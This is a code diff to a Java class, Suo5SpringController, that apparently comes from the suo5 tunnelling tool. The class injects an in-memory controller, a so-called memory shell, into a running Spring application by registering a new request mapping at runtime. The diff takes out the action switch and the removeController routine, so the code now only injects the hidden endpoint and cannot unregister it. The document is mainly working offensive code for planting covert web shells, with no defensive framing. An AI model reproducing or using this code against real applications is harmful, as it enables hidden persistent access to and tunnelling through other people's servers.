@@ -24,7 +24,6 @@ public class Suo5SpringController extends ClassLoader implements Runnable, Hostn
     private HashMap parameterMap;
     private String urlPattern;
     private static String userAgent;
-    private String action;
 
     public static HashMap addrs = collectAddr();
     public static HashMap ctx = new HashMap();
@@ -58,7 +57,6 @@ public class Suo5SpringController extends ClassLoader implements Runnable, Hostn
             this.parameterMap = (HashMap) obj;
             this.urlPattern = getp("urlPattern");
             this.userAgent = getp("userAgent");
-            this.action = getp("action");
             return true;
         } catch (Exception var3) {
             return false;
@@ -66,11 +64,7 @@ public class Suo5SpringController extends ClassLoader implements Runnable, Hostn
     }
 
     public String toString() {
-        if (this.action.equals("inject")) {
-            this.parameterMap.put("result", this.addController(new Suo5SpringController()).getBytes());
-        } else {
-            this.parameterMap.put("result", this.removeController().getBytes());
-        }
+        this.parameterMap.put("result", this.addController(new Suo5SpringController()).getBytes());
         this.parameterMap = null;
         return "";
     }
@@ -598,28 +592,6 @@ public class Suo5SpringController extends ClassLoader implements Runnable, Hostn
 
             // 注册 Controller
             requestMappingHandlerMapping.registerMapping(requestMappingInfo, springController, method);
-
-        } catch (Throwable e) {
-            return e.getMessage();
-        }
-        return "ok";
-    }
-
-    protected String removeController() {
-        try {
-            // 获取 WebApplicationContext
-            WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest().getServletContext());
-
-            // 获取 RequestMappingHandlerMapping
-            RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
-
-            // 构造 RequestMappingInfo
-            RequestMappingInfo.BuilderConfiguration options = new RequestMappingInfo.BuilderConfiguration();
-            options.setPatternParser(new PathPatternParser());
-            RequestMappingInfo requestMappingInfo = RequestMappingInfo.paths(this.urlPattern).options(options).build();
-
-            // 取消注册 Controller
-            requestMappingHandlerMapping.unregisterMapping(requestMappingInfo);
 
         } catch (Throwable e) {
             return e.getMessage();
